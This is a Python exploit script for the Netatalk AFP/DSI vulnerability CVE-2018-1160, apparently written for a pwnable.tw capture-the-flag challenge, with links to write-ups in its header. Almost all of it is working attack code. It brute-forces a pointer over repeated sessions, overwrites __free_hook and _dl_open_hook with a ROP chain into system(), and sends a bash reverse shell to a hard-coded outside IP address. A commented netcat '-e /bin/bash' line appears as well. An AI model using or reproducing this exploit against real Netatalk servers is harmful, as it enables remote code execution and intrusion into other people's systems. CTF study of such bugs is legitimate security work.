"""
https://xz.aliyun.com/t/3710#toc-0
https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk
https://ama2in9.top/2021/01/07/cve-2018-1160/
https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/
https://tacopwn.net/blog/2021/08/02/cve-2018-1160-expanding-the-original-18-year-old-vulnerability-exploit/
"""

#!/usr/bin/python3
# -*- coding: UTF-8 -*-
import struct
import socket
from pwn import *

host = "chall.pwnable.tw"
port = 10002                # 设置端口号



def getCmdAddr():
  i=0
  cmdaddr=b'\x00'
  while(len(cmdaddr)<5):
    ss = socket.socket()         # 创建 socket 对象
    # host = socket.gethostname() # 获取本地主机名
    ss.connect((host, port))
    print("[*] try : " + hex(i))
    sendDsiGetsession(ss,b'\x35'*16+cmdaddr+bytes([i]))
    i+=1
    data = ss.recv(1024)
    print(b"[*] recv : " + data)
    if(data == b'\x01\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x045555\x02\x04\x00\x00\x00\x80'):
      cmdaddr+=bytes([i-1])
      print(cmdaddr)
      i=0    
    ss.close()
  return b'\x7f' + cmdaddr

def sendDsiGetsession(sock,data):
  if(data==''):
    data    =  b'\x34'*16 # More than 4 will cover dsi struct,more than 16 will cover command point
  #print(data)
  cmddata =  b'\x01' # DSIOPT (1:DSIOPT_ATTNQUANT 2:DSIOPT_SERVQUANT)
  cmddata += struct.pack("b",len(data))+data

  cmdheader  =  b'\x00' # dsi->header.dsi_flags
  cmdheader  += b'\x04' # dsi->header.dsi_command(4:DSIFUNC_OPEN 3:DSIFUNC_STAT(free(dsi)))
  cmdheader  += b'\x00\x00'# dsi->header.dsi_requestID
  cmdheader  += b'\x00\x00\x00\x00' # dsi->header.dsi_data.dsi_code
  cmdheader  += struct.pack("I",socket.htonl(len(cmddata))) #dsi->header.dsi_len
  cmdheader  += b'\x00\x00\x00\x00' # dsi->header.dsi_reserved
  sock.send(cmdheader+cmddata)

def sendAfpOverDsi(sock,data):
  cmddata    =  data
  cmdheader  =  b'\x00' # dsi->header.dsi_flags
  cmdheader  += b'\x01' # dsi->cmd(1:DSIFUNC_CLOSE)
  cmdheader  += b'\x00\x00'# dsi->header.dsi_requestID
  cmdheader  += b'\x00\x00\x00\x00' # dsi->header.dsi_data.dsi_code
  cmdheader  += struct.pack("I",socket.htonl(len(cmddata))) #dsi->header.dsi_len
  cmdheader  += b'\x00\x00\x00\x00' # dsi->header.dsi_reserved
  sock.send(cmdheader+cmddata)
  
def create_afp(idx,payload):
    afp_command = bytes([idx]) # invoke the second entry in the table
    afp_command += b"\x00" # protocol defined padding 
    afp_command += payload
    dsi_header = b"\x00" # "request" flag
    dsi_header += b"\x02" # "AFP" command
    dsi_header += b"\x00\x02" # request id
    dsi_header += b"\x00\x00\x00\x00" # data offset
    dsi_header += struct.pack(">I", len(afp_command))
    dsi_header += b'\x00\x00\x00\x00' # reserved
    dsi_header += afp_command
    return dsi_header

def exploit(r, libc):
    
    sendDsiGetsession(r, b'\x35'*16 + p64(libc+0x3ed8e8-0x30)) #  overwrite afp_command buf with free_hook-0x30 
    context.arch = "amd64"

    r8=0
    r9=1
    r12=1
    r13=1
    r14=1
    r15=1
    rdi=libc+0x3ed8e8+8 # cmd buffer
    rsi=0x1111
    rbp=0x1111
    rbx=0x1111
    rdx=0x1211
    rcx=0x1211
    rsp=libc+0x3ed8e8
    rspp=libc+0x4f440 # system
    payload2=flat(
    r8,r9,
    0,0,r12,r13,r14,r15,rdi,rsi,rbp,rbx,rdx,0,rcx,rsp,rspp
    )
    rip="X.X.X.X"
    rport=11112
    # nc 192.168.28.128 12345 -t -e /bin/bash
    cmd=b'bash -c "bash -i >& /dev/tcp/152.136.151.131/18999 0>&1 " \x00' # cat flag to controled ip and port 
    payload = flat(b"\x00"*0x2e+p64(libc+0x166488)+cmd.ljust(0x2bb8,b"\x00")+p64(libc+0x3f04a8+8)+p64(libc+0x7EA1F)*4+p64(libc+0x52070+53)+payload2) #over write _free_hook and _dl_open_hook
    r.send(create_afp(0,payload))
    r.send(create_afp(18,flat(
        ""
    )))


libc = 0x7f05d8251000
r = remote(host, port)
exploit(r, libc)
r.interactive()
